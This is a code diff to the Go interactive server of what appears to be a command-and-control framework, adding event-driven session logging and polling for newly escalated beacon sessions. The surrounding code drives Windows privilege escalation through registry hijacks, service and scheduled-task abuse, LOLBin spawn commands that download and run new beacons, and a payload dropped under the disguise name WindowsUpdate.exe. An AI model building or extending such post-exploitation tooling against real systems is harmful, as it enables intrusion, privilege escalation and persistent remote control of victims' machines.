@@ -100,6 +100,9 @@ func NewInteractiveServer(logger *core.Logger, cfg *core.Config) *InteractiveSer
 	// Restore listener jobs from database
 	is.restoreListenerJobs()
 
+	// Start event-driven automation (logging, host management, etc.)
+	is.startEventHandlers()
+
 	// Auto-load modules from modules/empire directory
 	modulesPath := "modules/empire"
 	if err := moduleRegistry.LoadModulesFromDirectory(modulesPath); err != nil {
@@ -109,6 +112,50 @@ func NewInteractiveServer(logger *core.Logger, cfg *core.Config) *InteractiveSer
 	}
 
 	return is
+}
+
+// startEventHandlers starts event-driven handlers for logging and automation
+func (is *InteractiveServer) startEventHandlers() {
+	events := core.EventBroker.Subscribe()
+	if events == nil {
+		// Broker stopped or unavailable
+		is.logger.Error("Failed to subscribe to EventBroker")
+		return
+	}
+	go func() {
+		defer func() {
+			if events != nil {
+				core.EventBroker.Unsubscribe(events) // Cleanup on exit
+			}
+		}()
+		for event := range events {
+			// Event logging
+			is.logger.Debug("Event: %s", event.EventType)
+
+			// Log session events
+			if event.Session != nil {
+				// Use getter methods for thread safety
+				sessionID := shortID(event.Session.GetID())
+				sessionType := string(event.Session.GetType())
+				remoteAddr := event.Session.GetRemoteAddr()
+
+				switch event.EventType {
+				case core.EventSessionOpened:
+					is.logger.Info("Session opened: %s (%s) from %s",
+						sessionID, sessionType, remoteAddr)
+				case core.EventSessionClosed:
+					is.logger.Info("Session closed: %s", sessionID)
+				case core.EventSessionKilled:
+					is.logger.Info("Session killed: %s", sessionID)
+				case core.EventSessionPrivilegeChanged:
+					oldPriv := event.Metadata["old_privilege"]
+					newPriv := event.Metadata["new_privilege"]
+					is.logger.Info("Session privilege changed: %s (%s -> %s)",
+						sessionID, oldPriv, newPriv)
+				}
+			}
+		}
+	}()
 }
 
 func (is *InteractiveServer) restoreListenerJobs() {
@@ -198,8 +245,13 @@ func (is *InteractiveServer) startListenerJob(listenerType, addr string, dbJob *
 // Run starts the interactive server CLI
 func (is *InteractiveServer) Run() {
 	defer func() {
+		// Cleanup on exit
 		if is.input != nil {
 			is.input.Close()
+		}
+		// Stop reaction manager (unsubscribes from EventBroker)
+		if is.reactionMgr != nil {
+			is.reactionMgr.Stop()
 		}
 	}()
 
@@ -464,7 +516,7 @@ func (is *InteractiveServer) startServer(listenAddr string) error {
 	fmt.Printf("[*] Starting C2 server on %s...\n", listenAddr)
 
 	is.server = transport.NewServerWithTaskQueue(is.config, is.logger, is.taskQueue)
-	
+
 	// Set up stager getter for getsystemsafe
 	is.server.SetStagerGetter(func(callbackURL string) ([]byte, error) {
 		gen := payload.NewGenerator(is.logger, is.moduleRegistry)
@@ -1414,9 +1466,9 @@ func (is *InteractiveServer) handleJobs(args []string) error {
 			// Call handleKill with the job ID
 			return is.handleKill([]string{args[1]})
 		}
-		return fmt.Errorf("unknown jobs option: %s\n" +
-			"  Usage: jobs [--kill|-k <job_id>]\n" +
-			"  Example: jobs\n" +
+		return fmt.Errorf("unknown jobs option: %s\n"+
+			"  Usage: jobs [--kill|-k <job_id>]\n"+
+			"  Example: jobs\n"+
 			"  Example: jobs --kill 3", args[0])
 	}
 
@@ -1537,15 +1589,15 @@ func (is *InteractiveServer) printSessions() {
 
 	// Dark header with white text using ANSI codes
 	headerRow := table.Row{
-		"\033[1;34mID\033[0m",           // Bold dark blue
-		"\033[1;34mType\033[0m",         // Bold dark blue
-		"\033[1;34mUser\033[0m",         // Bold dark blue
-		"\033[1;34mPrivilege\033[0m",    // Bold dark blue
-		"\033[1;34mTransport\033[0m",    // Bold dark blue
-		"\033[1;34mRemote Addr\033[0m",  // Bold dark blue
-		"\033[1;34mConnected\033[0m",    // Bold dark blue
-		"\033[1;34mLast Seen\033[0m",    // Bold dark blue
-		"\033[1;34mState\033[0m",        // Bold dark blue
+		"\033[1;34mID\033[0m",          // Bold dark blue
+		"\033[1;34mType\033[0m",        // Bold dark blue
+		"\033[1;34mUser\033[0m",        // Bold dark blue
+		"\033[1;34mPrivilege\033[0m",   // Bold dark blue
+		"\033[1;34mTransport\033[0m",   // Bold dark blue
+		"\033[1;34mRemote Addr\033[0m", // Bold dark blue
+		"\033[1;34mConnected\033[0m",   // Bold dark blue
+		"\033[1;34mLast Seen\033[0m",   // Bold dark blue
+		"\033[1;34mState\033[0m",       // Bold dark blue
 	}
 	t.AppendHeader(headerRow)
 
@@ -2078,7 +2130,7 @@ func (is *InteractiveServer) sessionShell(sessionID string) error {
 			}
 			if hasUnsupported {
 				fmt.Println("[!] Note: C# modules are not yet supported by Go implants")
-				fmt.Println("    They will fail with 'Module not available' error\n")
+				fmt.Println("    They will fail with 'Module not available' error")
 			}
 
 			for i, task := range sessionTasks {
@@ -2302,6 +2354,28 @@ func (is *InteractiveServer) pollTaskResult(sessionID, taskID string) {
 	is.pollTaskResultWithTimeout(sessionID, taskID, 10*time.Second)
 }
 
+// waitForSessionWithPrivilege polls for a new session with the target privilege level
+// Returns the session if found, nil if timeout. Uses polling instead of fixed sleep for determinism.
+func (is *InteractiveServer) waitForSessionWithPrivilege(targetPriv core.PrivilegeLevel, timeout time.Duration, excludeSessionID string) *core.Session {
+	deadline := time.Now().Add(timeout)
+	pollInterval := 500 * time.Millisecond
+
+	for time.Now().Before(deadline) {
+		allSessions := is.sessionMgr.ListSessions()
+		for _, sess := range allSessions {
+			// Skip excluded session (usually the current one)
+			if excludeSessionID != "" && sess.ID == excludeSessionID {
+				continue
+			}
+			if sess.GetPrivilegeLevel() == targetPriv {
+				return sess
+			}
+		}
+		time.Sleep(pollInterval)
+	}
+	return nil
+}
+
 // pollTaskResultWithTimeout polls for task result and displays it with custom timeout
 func (is *InteractiveServer) pollTaskResultWithTimeout(sessionID, taskID string, timeout time.Duration) {
 	if is.taskQueue == nil {
@@ -2313,37 +2387,35 @@ func (is *InteractiveServer) pollTaskResultWithTimeout(sessionID, taskID string,
 	ticker := time.NewTicker(200 * time.Millisecond) // Poll every 200ms for faster response
 	defer ticker.Stop()
 
-	for {
-		select {
-		case <-ticker.C:
-			task := is.taskQueue.Get(taskID)
-			if task == nil {
-				// Task removed - may have completed or timed out
-				return
-			}
+	// Use for-range over ticker channel, checking timeout on each iteration
+	for range ticker.C {
+		task := is.taskQueue.Get(taskID)
+		if task == nil {
+			// Task removed - may have completed or timed out
+			return
+		}
 
-			if task.Status == "completed" && task.Result != nil {
-				// Display result
-				if resultMap, ok := task.Result.(map[string]interface{}); ok {
-					if resultValue, ok := resultMap["result"].(string); ok {
-						// Check for common errors and provide helpful messages
-						if strings.Contains(resultValue, "Script must be run as administrator") {
-							fmt.Println("[!] Privilege escalation failed: Current session is not running as Administrator")
-							fmt.Println("    The 'getsystem' module requires Administrator privileges to elevate to SYSTEM")
-							fmt.Println("    Use 'shell whoami /groups' to check current privileges")
-							fmt.Println("    Try other privilege escalation modules if you're not admin yet")
-						} else {
-							fmt.Println(resultValue)
-						}
+		if task.Status == "completed" && task.Result != nil {
+			// Display result
+			if resultMap, ok := task.Result.(map[string]interface{}); ok {
+				if resultValue, ok := resultMap["result"].(string); ok {
+					// Check for common errors and provide helpful messages
+					if strings.Contains(resultValue, "Script must be run as administrator") {
+						fmt.Println("[!] Privilege escalation failed: Current session is not running as Administrator")
+						fmt.Println("    The 'getsystem' module requires Administrator privileges to elevate to SYSTEM")
+						fmt.Println("    Use 'shell whoami /groups' to check current privileges")
+						fmt.Println("    Try other privilege escalation modules if you're not admin yet")
+					} else {
+						fmt.Println(resultValue)
 					}
 				}
-				return
 			}
+			return
+		}
 
-			if time.Since(start) > timeout {
-				fmt.Printf("[!] Task %s timed out after %v\n", taskID, timeout)
-				return
-			}
+		if time.Since(start) > timeout {
+			fmt.Printf("[!] Task %s timed out after %v\n", taskID, timeout)
+			return
 		}
 	}
 }
@@ -2726,28 +2798,28 @@ func (is *InteractiveServer) executeGetSystem(sessionID string) error {
 			for idx, cmdTemplate := range method.Commands {
 				// Detect what type of command this is and handle accordingly
 				var cmd string
-				
+
 				// Check if this is a copy command that needs a file path
-				isCopyCommand := strings.Contains(cmdTemplate, `copy "%s"`) && 
-					(strings.Contains(cmdTemplate, `%%WINDIR%%`) || strings.Contains(cmdTemplate, `System32`) || 
-					 strings.Contains(cmdTemplate, `Program Files`) || strings.Contains(cmdTemplate, `%%TEMP%%`))
-				
+				isCopyCommand := strings.Contains(cmdTemplate, `copy "%s"`) &&
+					(strings.Contains(cmdTemplate, `%%WINDIR%%`) || strings.Contains(cmdTemplate, `System32`) ||
+						strings.Contains(cmdTemplate, `Program Files`) || strings.Contains(cmdTemplate, `%%TEMP%%`))
+
 				isDelCommand := strings.Contains(cmdTemplate, `del "%s"`) || strings.Contains(cmdTemplate, `del "%W`)
-				
+
 				isRegImagePath := strings.Contains(cmdTemplate, `reg add`) && strings.Contains(cmdTemplate, `/v ImagePath`) && strings.Contains(cmdTemplate, `/d "%s"`)
-				
+
 				isSchTasksTr := strings.Contains(cmdTemplate, `schtasks`) && (strings.Contains(cmdTemplate, `/tr "%s"`) || (strings.Contains(cmdTemplate, `/change`) && strings.Contains(cmdTemplate, `/tr "%s"`)))
-				
+
 				isSchTasksXml := strings.Contains(cmdTemplate, `schtasks`) && strings.Contains(cmdTemplate, `/xml "%s"`)
-				
+
 				isRegAddD := strings.Contains(cmdTemplate, `reg add`) && strings.Contains(cmdTemplate, `/d "%s"`) && !isRegImagePath
-				
+
 				isScCreate := strings.Contains(cmdTemplate, `sc create`) && strings.Contains(cmdTemplate, `binPath= "%s"`)
-				
+
 				isScConfig := strings.Contains(cmdTemplate, `sc config`) && strings.Contains(cmdTemplate, `binPath= "%s"`)
-				
+
 				isWmic := strings.Contains(cmdTemplate, `wmic`) && strings.Contains(cmdTemplate, `%s`)
-				
+
 				if isCopyCommand {
 					// For copy commands, we need to download the file first, then copy it
 					hasDownloaded := false
@@ -2757,7 +2829,7 @@ func (is *InteractiveServer) executeGetSystem(sessionID string) error {
 							break
 						}
 					}
-					
+
 					if !hasDownloaded {
 						// First copy command - download the file first
 						filePath := `%TEMP%\WindowsUpdate.exe`
@@ -2773,7 +2845,7 @@ func (is *InteractiveServer) executeGetSystem(sessionID string) error {
 						is.server.EnqueueTask(downloadTask)
 						is.pollTaskResultWithTimeout(sessionID, downloadTaskID, 15*time.Second)
 					}
-					
+
 					// Now use the file path for the copy command
 					filePath := `%TEMP%\WindowsUpdate.exe`
 					// Extract destination from template
@@ -2924,19 +2996,13 @@ func (is *InteractiveServer) executeGetSystem(sessionID string) error {
 				continue
 			}
 
-			// Wait for escalation to take effect
+			// Wait for escalation to take effect - use polling instead of fixed sleep
 			fmt.Printf("[*] Waiting for new SYSTEM session to connect...\n")
-			time.Sleep(8 * time.Second)
-
-			// Check if a new SYSTEM session appeared
-			allSessions := is.sessionMgr.ListSessions()
-			for _, newSession := range allSessions {
-				if newSession.GetPrivilegeLevel() == core.PrivilegeSystem {
-					fmt.Printf("[+] Successfully escalated to SYSTEM using %s!\n", method.Name)
-					fmt.Printf("[+] New SYSTEM session: %s\n", newSession.ID)
-					escalatedToSystem = true
-					break
-				}
+			newSession := is.waitForSessionWithPrivilege(core.PrivilegeSystem, 10*time.Second, sessionID)
+			if newSession != nil {
+				fmt.Printf("[+] Successfully escalated to SYSTEM using %s!\n", method.Name)
+				fmt.Printf("[+] New SYSTEM session: %s\n", newSession.ID)
+				escalatedToSystem = true
 			}
 
 			if escalatedToSystem {
@@ -3055,7 +3121,7 @@ func (is *InteractiveServer) executeGetSystemSafe(sessionID string) error {
 
 			// Generate spawn command using LOLBins
 			spawnCmd := lolbinEsc.GenerateSpawnCommand(callbackURL, "admin")
-			
+
 			// Execute method commands with proper timing and error checking
 			commandFailed := false
 			for idx, cmdTemplate := range method.Commands {
@@ -3081,7 +3147,7 @@ func (is *InteractiveServer) executeGetSystemSafe(sessionID string) error {
 					// For other commands, use spawnCmd as-is
 					cmd = fmt.Sprintf(cmdTemplate, spawnCmd)
 				}
-				
+
 				taskID := fmt.Sprintf("task-%d", time.Now().UnixNano())
 				task := &tasks.Task{
 					ID:         taskID,
@@ -3090,7 +3156,7 @@ func (is *InteractiveServer) executeGetSystemSafe(sessionID string) error {
 					Parameters: map[string]interface{}{"session_id": sessionID},
 				}
 				is.server.EnqueueTask(task)
-				
+
 				// Determine timeout based on command type
 				timeout := 10 * time.Second
 				if strings.Contains(cmd, "schtasks") {
@@ -3104,9 +3170,9 @@ func (is *InteractiveServer) executeGetSystemSafe(sessionID string) error {
 				} else if strings.Contains(cmd, "cmstp") {
 					timeout = 15 * time.Second
 				}
-				
+
 				is.pollTaskResultWithTimeout(sessionID, taskID, timeout)
-				
+
 				// Check command result for errors
 				taskResult := is.taskQueue.Get(taskID)
 				if taskResult != nil && taskResult.Status == "completed" {
@@ -3139,35 +3205,31 @@ func (is *InteractiveServer) executeGetSystemSafe(sessionID string) error {
 					}
 				}
 			}
-			
+
 			if commandFailed {
 				fmt.Printf("[!] Method %s failed during execution, trying next...\n", method.Name)
 				continue
 			}
 
-			// Wait for escalation to take effect
+			// Wait for escalation to take effect - use polling instead of fixed sleep
 			// Registry hijack methods spawn NEW elevated processes (eventvwr.exe, fodhelper.exe, etc.)
 			// These processes will execute our spawn command, which downloads and runs a new beacon
 			// We need to wait for the new beacon to connect, then check if it's admin
 			fmt.Printf("[*] Waiting for elevated process to spawn new beacon...\n")
-			time.Sleep(8 * time.Second)
+			newAdminSession := is.waitForSessionWithPrivilege(core.PrivilegeAdmin, 10*time.Second, sessionID)
 
 			// Check if a new Admin session appeared (the spawned process should connect as admin)
-			allSessions := is.sessionMgr.ListSessions()
 			foundAdminSession := false
-			for _, sess := range allSessions {
-				if sess.GetPrivilegeLevel() == core.PrivilegeAdmin && sess.ID != sessionID {
-					fmt.Printf("[+] New Admin session detected: %s (from %s method)\n", shortID(sess.ID), method.Name)
-					// Update original session privilege level for tracking
-					session.SetPrivilegeLevel(core.PrivilegeAdmin)
-					session.SetMetadata("privilege_level", "admin")
-					escalatedToAdmin = true
-					currentPriv = core.PrivilegeAdmin
-					foundAdminSession = true
-					break
-				}
+			if newAdminSession != nil {
+				fmt.Printf("[+] New Admin session detected: %s (from %s method)\n", shortID(newAdminSession.ID), method.Name)
+				// Update original session privilege level for tracking
+				session.SetPrivilegeLevel(core.PrivilegeAdmin)
+				session.SetMetadata("privilege_level", "admin")
+				escalatedToAdmin = true
+				currentPriv = core.PrivilegeAdmin
+				foundAdminSession = true
 			}
-			
+
 			// Also check if current session got elevated (some methods might elevate in-place)
 			if !foundAdminSession {
 				newPriv, _, err := is.detectPrivilegeLevelLOLBin(sessionID)
@@ -3180,7 +3242,7 @@ func (is *InteractiveServer) executeGetSystemSafe(sessionID string) error {
 					foundAdminSession = true
 				}
 			}
-			
+
 			if foundAdminSession {
 				// Cleanup registry keys (non-blocking, errors are OK)
 				fmt.Printf("[*] Cleaning up registry modifications...\n")
@@ -3250,28 +3312,28 @@ func (is *InteractiveServer) executeGetSystemSafe(sessionID string) error {
 			for idx, cmdTemplate := range method.Commands {
 				// Detect what type of command this is and handle accordingly
 				var cmd string
-				
+
 				// Check if this is a copy command that needs a file path
-				isCopyCommand := strings.Contains(cmdTemplate, `copy "%s"`) && 
-					(strings.Contains(cmdTemplate, `%%WINDIR%%`) || strings.Contains(cmdTemplate, `System32`) || 
-					 strings.Contains(cmdTemplate, `Program Files`) || strings.Contains(cmdTemplate, `%%TEMP%%`))
-				
+				isCopyCommand := strings.Contains(cmdTemplate, `copy "%s"`) &&
+					(strings.Contains(cmdTemplate, `%%WINDIR%%`) || strings.Contains(cmdTemplate, `System32`) ||
+						strings.Contains(cmdTemplate, `Program Files`) || strings.Contains(cmdTemplate, `%%TEMP%%`))
+
 				isDelCommand := strings.Contains(cmdTemplate, `del "%s"`) || strings.Contains(cmdTemplate, `del "%W`)
-				
+
 				isRegImagePath := strings.Contains(cmdTemplate, `reg add`) && strings.Contains(cmdTemplate, `/v ImagePath`) && strings.Contains(cmdTemplate, `/d "%s"`)
-				
+
 				isSchTasksTr := strings.Contains(cmdTemplate, `schtasks`) && (strings.Contains(cmdTemplate, `/tr "%s"`) || (strings.Contains(cmdTemplate, `/change`) && strings.Contains(cmdTemplate, `/tr "%s"`)))
-				
+
 				isSchTasksXml := strings.Contains(cmdTemplate, `schtasks`) && strings.Contains(cmdTemplate, `/xml "%s"`)
-				
+
 				isRegAddD := strings.Contains(cmdTemplate, `reg add`) && strings.Contains(cmdTemplate, `/d "%s"`) && !isRegImagePath
-				
+
 				isScCreate := strings.Contains(cmdTemplate, `sc create`) && strings.Contains(cmdTemplate, `binPath= "%s"`)
-				
+
 				isScConfig := strings.Contains(cmdTemplate, `sc config`) && strings.Contains(cmdTemplate, `binPath= "%s"`)
-				
+
 				isWmic := strings.Contains(cmdTemplate, `wmic`) && strings.Contains(cmdTemplate, `%s`)
-				
+
 				if isCopyCommand {
 					// For copy commands, we need to download the file first, then copy it
 					hasDownloaded := false
@@ -3281,7 +3343,7 @@ func (is *InteractiveServer) executeGetSystemSafe(sessionID string) error {
 							break
 						}
 					}
-					
+
 					if !hasDownloaded {
 						// First copy command - download the file first
 						filePath := `%TEMP%\WindowsUpdate.exe`
@@ -3296,7 +3358,7 @@ func (is *InteractiveServer) executeGetSystemSafe(sessionID string) error {
 						is.server.EnqueueTask(downloadTask)
 						is.pollTaskResultWithTimeout(sessionID, downloadTaskID, 15*time.Second)
 					}
-					
+
 					filePath := `%TEMP%\WindowsUpdate.exe`
 					cmd = fmt.Sprintf(cmdTemplate, filePath)
 				} else if isDelCommand {
@@ -3368,7 +3430,7 @@ func (is *InteractiveServer) executeGetSystemSafe(sessionID string) error {
 					Parameters: map[string]interface{}{"session_id": sessionID},
 				}
 				is.server.EnqueueTask(task)
-				
+
 				// Determine timeout based on command type
 				timeout := 10 * time.Second
 				if strings.Contains(cmd, "schtasks") {
@@ -3380,9 +3442,9 @@ func (is *InteractiveServer) executeGetSystemSafe(sessionID string) error {
 				} else if strings.Contains(cmd, "ping") {
 					timeout = 5 * time.Second
 				}
-				
+
 				is.pollTaskResultWithTimeout(sessionID, taskID, timeout)
-				
+
 				// Check command result for errors
 				taskResult := is.taskQueue.Get(taskID)
 				if taskResult != nil && taskResult.Status == "completed" {
@@ -3401,7 +3463,7 @@ func (is *InteractiveServer) executeGetSystemSafe(sessionID string) error {
 							break
 						}
 					}
-					
+
 					// Check for common error patterns
 					var output string
 					if resultMap, ok := taskResult.Result.(map[string]interface{}); ok {
@@ -3431,7 +3493,7 @@ func (is *InteractiveServer) executeGetSystemSafe(sessionID string) error {
 					}
 				}
 			}
-			
+
 			if commandFailed {
 				fmt.Printf("[!] Method %s failed during execution, trying next...\n", method.Name)
 				continue
@@ -3439,23 +3501,15 @@ func (is *InteractiveServer) executeGetSystemSafe(sessionID string) error {
 
 			// Wait for new SYSTEM session to connect (spawned process needs time to beacon)
 			fmt.Printf("[*] Waiting for new SYSTEM session to connect...\n")
-			time.Sleep(10 * time.Second)
-			
-			// Check if a new SYSTEM session appeared
-			allSessions := is.sessionMgr.ListSessions()
-			for _, sess := range allSessions {
-				if sess.GetPrivilegeLevel() == core.PrivilegeSystem {
-					fmt.Printf("[+] New SYSTEM session detected: %s\n", shortID(sess.ID))
-					escalatedToSystem = true
-					break
-				}
-			}
-			
-			if escalatedToSystem {
+			newSystemSession := is.waitForSessionWithPrivilege(core.PrivilegeSystem, 10*time.Second, sessionID)
+			if newSystemSession != nil {
+				fmt.Printf("[+] New SYSTEM session detected: %s\n", shortID(newSystemSession.ID))
+				escalatedToSystem = true
 				break
 			} else {
 				fmt.Printf("[!] Method %s did not produce SYSTEM session, trying next...\n", method.Name)
-				time.Sleep(2 * time.Second)
+				// Brief pause between attempts - acceptable for user feedback
+				time.Sleep(500 * time.Millisecond)
 			}
 		}
 
@@ -3520,7 +3574,7 @@ func (is *InteractiveServer) detectPrivilegeLevelLOLBin(sessionID string) (core.
 	// Use LOLBin escalation helper to parse
 	lolbinEsc := &privesc.LOLBinEscalation{}
 	privLevel, username := lolbinEsc.DetectPrivilegeLevel(output)
-	
+
 	var privLevelEnum core.PrivilegeLevel
 	switch privLevel {
 	case "system":
@@ -3564,7 +3618,7 @@ func (is *InteractiveServer) executeGetPrivs(sessionID string) error {
 				return fmt.Errorf("failed to detect privilege level: %v", err)
 			}
 		}
-		
+
 		// Update session with detected info
 		session.SetPrivilegeLevel(currentPriv)
 		session.SetUsername(username)
@@ -3576,7 +3630,7 @@ func (is *InteractiveServer) executeGetPrivs(sessionID string) error {
 	fmt.Println("\n" + strings.Repeat("=", 60))
 	fmt.Println("PRIVILEGE INFORMATION")
 	fmt.Println(strings.Repeat("=", 60))
-	
+
 	// Color code based on privilege level
 	var privColor, resetColor string
 	switch currentPriv {
@@ -3590,10 +3644,10 @@ func (is *InteractiveServer) executeGetPrivs(sessionID string) error {
 		privColor = "\033[90m" // Gray
 	}
 	resetColor = "\033[0m"
-	
+
 	fmt.Printf("Username:  %s\n", username)
 	fmt.Printf("Privilege: %s%s%s\n", privColor, strings.ToUpper(string(currentPriv)), resetColor)
-	
+
 	// Add helpful context
 	switch currentPriv {
 	case core.PrivilegeSystem:
@@ -3607,9 +3661,9 @@ func (is *InteractiveServer) executeGetPrivs(sessionID string) error {
 	default:
 		fmt.Println("\n[!] Privilege level could not be determined")
 	}
-	
+
 	fmt.Println(strings.Repeat("=", 60) + "\n")
-	
+
 	return nil
 }
 
@@ -3773,10 +3827,10 @@ func (is *InteractiveServer) executeAccessChkNamedPipes(sessionID string) ([]str
 	// R account2
 	pipes := make([]string, 0)
 	lines := strings.Split(output, "\n")
-	
+
 	for i, line := range lines {
 		line = strings.TrimSpace(line)
-		
+
 		// Look for pipe paths (start with \pipe\)
 		if strings.HasPrefix(line, "\\pipe\\") {
 			// Check if next line has write permissions
@@ -3956,6 +4010,15 @@ func (is *InteractiveServer) executeKill(sessionID string) error {
 	session, ok := is.sessionMgr.GetSession(sessionID)
 	if ok {
 		session.SetState(core.SessionStateDead)
+		// Publish SessionKilled event
+		core.EventBroker.Publish(core.Event{
+			EventType: core.EventSessionKilled,
+			Session:   session,
+			Metadata: map[string]interface{}{
+				"session_id": session.GetID(), // Use getter for thread safety
+				"reason":     "operator_killed",
+			},
+		})
 	}
 
 	// Queue kill task for session
@@ -4810,12 +4873,8 @@ func (is *InteractiveServer) syncSessions() {
 
 				is.sessionMgr.AddSession(session)
 
-				// Trigger reaction manager for new session
-				is.reactionMgr.TriggerEvent(reactions.EventTypeSessionNew, map[string]interface{}{
-					"session_id": id,
-					"type":       string(sessionType),
-					"transport":  transport,
-				})
+				// Note: SessionOpened event is automatically published by SessionManager.AddSession()
+				// Reactions system subscribes to EventBroker and handles it automatically
 			}
 		}
 	}
@@ -4914,11 +4973,7 @@ func (is *InteractiveServer) syncSessionToManager(id string, serverSession *tran
 			is.input.SetPrompt(getPrompt(is.currentSession))
 		}
 
-		// Trigger reaction manager for new session
-		is.reactionMgr.TriggerEvent(reactions.EventTypeSessionNew, map[string]interface{}{
-			"session_id": id,
-			"type":       string(sessionType),
-			"transport":  transportType,
-		})
+		// Note: SessionOpened event is automatically published by SessionManager.AddSession()
+		// Reactions system subscribes to EventBroker and handles it automatically
 	}
 }
